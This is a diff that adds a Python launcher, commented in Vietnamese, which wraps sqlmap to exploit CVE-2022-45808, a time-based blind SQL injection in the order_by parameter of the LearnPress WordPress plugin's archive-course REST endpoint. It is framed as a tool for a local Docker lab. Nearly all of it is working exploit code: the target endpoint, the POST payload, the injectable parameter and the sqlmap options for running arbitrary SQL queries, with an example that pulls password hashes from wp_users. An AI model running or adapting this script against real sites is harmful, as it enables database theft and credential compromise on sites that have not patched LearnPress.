@@ -1,0 +1,129 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+
+"""
+Launcher sqlmap tối ưu cho lab LearnPress CVE-2022-45808
+
+- Mặc định target: Docker WordPress ở http://localhost:8081
+- Mặc định endpoint: /wp-json/lp/v1/courses/archive-course
+- Mặc định injection param: order_by  (CVE-2022-45808, LearnPress <= 4.1.7.3.2)
+- Dùng time-based blind SQLi (technique T), level/risk thấp cho nhanh.
+
+Cách dùng nhanh:
+    python3 sqlmap.py "SELECT @@version"
+    python3 sqlmap.py "select user_pass from wp_users where id=1"
+
+Nếu muốn dùng sqlmap như bình thường (tự chỉ định -u, --data, ...):
+    python3 sqlmap.py -u "http://x" --data="a=1" ...
+"""
+
+import os
+import sys
+import subprocess
+
+BASE_DIR = os.path.dirname(os.path.abspath(__file__))
+
+# Đường dẫn tới sqlmap core (repo gốc) – giữ nguyên, không sửa
+SQLMAP_CORE = os.path.join(BASE_DIR, "sqlmap", "sqlmap.py")
+
+# --- Cấu hình mặc định cho Docker lab LearnPress CVE-2022-45808 ---
+
+# URL REST API archive-course của LearnPress trong Docker
+DEFAULT_URL = os.environ.get(
+    "LP_URL",
+    "http://localhost:8081/wp-json/lp/v1/courses/archive-course"
+)
+
+# POST data tối thiểu để trigger query, tron đó order_by là param bị SQLi
+DEFAULT_DATA = os.environ.get(
+    "LP_DATA",
+    "c_search=X&order_by=ID&order=DESC&limit=10&return_type=html"
+)
+
+# Thời gian delay cho time-based (nếu thấy quá chậm có thể giảm xuống 1)
+DEFAULT_TIME_SEC = os.environ.get("LP_TIMESEC", "2")
+
+# Có thể bật/tắt thread khi dump
+DEFAULT_THREADS = os.environ.get("LP_THREADS", "5")
+
+
+def has_manual_url(args):
+    """
+    Nếu user truyền -u / --url thì không dùng profile auto cho LearnPress nữa,
+    mà chuyển sang chạy sqlmap-core kiểu bình thường.
+    """
+    for a in args:
+        if a == "-u" or a.startswith("-u") or a.startswith("--url"):
+            return True
+    return False
+
+
+def build_learnpress_profile(args):
+    """
+    Dùng profile auto cho LearnPress CVE-2022-45808:
+
+    - Nếu arg đầu tiên KHÔNG bắt đầu bằng '-' thì coi là câu lệnh SQL
+      cần chạy qua --sql-query.
+    - Các option còn lại (bắt đầu bằng '-') sẽ append vào cuối.
+    """
+    sql_query = None
+    pass_through = []
+
+    for a in args:
+        if a.startswith("-"):
+            pass_through.append(a)
+        elif sql_query is None:
+            sql_query = a
+        else:
+            # Nếu có thêm tham số positional nữa thì cứ đẩy qua cho sqlmap
+            pass_through.append(a)
+
+    if not sql_query:
+        # Nếu user không truyền gì, chạy mặc định cho vui
+        sql_query = "SELECT @@version"
+
+    cmd = [
+        sys.executable,
+        SQLMAP_CORE,
+        "-u", DEFAULT_URL,
+        "--data", DEFAULT_DATA,
+        "-p", "order_by",      # param bị dính SQLi (CVE-2022-45808)
+        "--dbms", "MySQL",
+        "--level", "1",
+        "--risk", "1",
+        "--technique", "T",    # Time-based blind (nhanh hơn nếu DB local)
+        "--time-sec", DEFAULT_TIME_SEC,
+        "--threads", DEFAULT_THREADS,
+        "--batch",             # auto trả lời
+        "--flush-session",     # tránh reuse kết quả cũ khi thay query
+        "--sql-query", sql_query,
+    ] + pass_through
+
+    return cmd
+
+
+def main():
+    args = sys.argv[1:]
+
+    if not os.path.isfile(SQLMAP_CORE):
+        print("[!] Không tìm thấy sqlmap core tại:", SQLMAP_CORE)
+        print("    Hãy clone sqlmap vào thư mục 'sqlmap/' cạnh file này.")
+        sys.exit(1)
+
+    if has_manual_url(args):
+        # Chế độ FULL: user tự dùng sqlmap như bình thường
+        cmd = [sys.executable, SQLMAP_CORE] + args
+        mode = "FORWARD (sqlmap gốc)"
+    else:
+        # Chế độ FAST: profile LearnPress CVE-2022-45808
+        cmd = build_learnpress_profile(args)
+        mode = "FAST (LearnPress CVE-2022-45808 profile)"
+
+    print("[*] Mode:", mode)
+    print("[*] Command:\n  " + " ".join(cmd) + "\n")
+
+    subprocess.call(cmd)
+
+
+if __name__ == "__main__":
+    main()
